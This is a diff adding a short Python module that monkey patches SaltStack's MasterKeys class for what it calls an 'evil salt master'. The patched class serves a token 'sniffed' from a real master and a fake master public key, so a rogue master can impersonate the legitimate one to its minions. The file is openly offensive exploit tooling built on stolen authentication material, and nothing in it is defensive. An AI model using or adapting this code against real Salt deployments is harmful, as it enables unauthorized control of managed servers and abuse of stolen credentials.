@@ -1,0 +1,20 @@
+"""
+Monkey patch our evil salt master to serve the token we retrieved earlier
+"""
+import os
+
+import salt.crypt
+
+class EvilMasterKeys(salt.crypt.MasterKeys):
+    def __gen_token(self):
+        token_path = os.path.join(self.opts['pki_dir'], 'token')
+        return open(token_path).read()
+
+    def get_pub_str(self):
+        """
+        Return the public key of the master who's token we sniffed
+        """
+        fake_key_path = os.path.join(self.opts['pki_dir'], 'fake_master.pub')
+        return open(fake_key_path).read()
+
+salt.crypt.MasterKeys = EvilMasterKeys
